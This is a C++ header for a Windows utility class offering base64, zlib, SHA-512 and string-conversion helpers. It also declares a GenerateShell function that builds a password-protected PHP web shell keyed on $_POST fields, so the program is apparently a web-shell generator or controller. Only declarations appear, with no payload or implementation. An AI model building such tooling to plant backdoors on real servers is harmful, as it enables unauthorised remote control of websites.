#ifndef _STRINGS_H_
#define _STRINGS_H_

#include <tchar.h>
#include <string.h>
#include <math.h>
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>

#include "base64.h"
#include "sha2.h"
#include "zlib\include\zlib.h"
#pragma comment(lib, "zlib\\lib\\zdll.lib")

#define ZLIB_DATA_COMPRESSION_LEVEL Z_BEST_COMPRESSION

class Strings
{
private:
    struct FUNCTION_INFO
    {
        // Needed
        char *variable;
        char *function;
    };

    // PHP variables
    struct HASHING_INFO
    {
        TCHAR *function_name;
        TCHAR *hash_type;
        TCHAR *hash_variable;
        unsigned char *init_hash;
    };

    int GenerateVariables(TCHAR *buffer, size_t buflen, HASHING_INFO *hashing_info, FUNCTION_INFO *functions, size_t functions_length);
    TCHAR *BaseEncode(char *buffer, size_t buffer_length, int to_base);
    
public:
    Strings();
    ~Strings();

    // Returns a BASE64 encoded char* ptr of the src data
    char *WideCharToEncodedBase64String(TCHAR *src);

    // Returns a char* ptr to the BASE64 decoded data
    char *Base64StringToDecodedChar(TCHAR *base64, size_t *out_bytes);

    // Returns a wchar_t ptr to the BASE64 decoded data
    TCHAR *Base64StringToDecodedWideChar(TCHAR *base64);

    // Appends a string to a string
    size_t AppendString(IN char **string1, IN char *string2);

    // Appends a byte array (data) to a byte array (buffer)
    size_t AppendData(IN char **buffer, IN size_t buffer_size_bytes, char *data, size_t data_size_bytes);

    // ZLib routine; inflates the data returned from gzdeflate (PHP)
    unsigned char *Inflate(unsigned char *deflated_data, size_t data_size_bytes, size_t *out_bytes);
    unsigned char *Compress(unsigned char *data, size_t data_size_bytes, size_t *out_bytes);

    // Generates the PHP shell with the given $_POST value for the password, the password value itself, and the $_POST value for the command key
    TCHAR *GenerateShell(char *key, char *value, char *command_key);

    // Get's the SHA512 value from the *in ptr
    void GetSHA512(IN unsigned char *in, IN size_t in_bytes, OUT unsigned char *out);
    char *GetSHA512HEX(IN unsigned char *in, IN size_t in_bytes);

    // copies a static allocated string to a dynamic allocated string
    char *GetDynamicString(const char *str);

    // Converts a string from one encoding to UTF16 (wchar_t*)
    wchar_t *ConvertCharStringToWideChar(IN unsigned int codepage, IN char *src, IN size_t src_size_bytes, OUT size_t *out_bytes);

    char *ConvertWideCharStringToChar(IN unsigned int codepage, IN wchar_t *src, IN size_t src_size_bytes, OUT size_t *out_bytes);

    // Stores a wchar_t *byte array into a char *array; does not convert from codepages or whatever
    char *StoreWideCharBytesInCharBytes(IN wchar_t *src, IN size_t src_size_chars, OUT size_t *out_bytes);
    wchar_t *StoreCharBytesInWideCharBytes(IN char *src, IN size_t src_size_chars, OUT size_t *out_bytes);
};

#endif
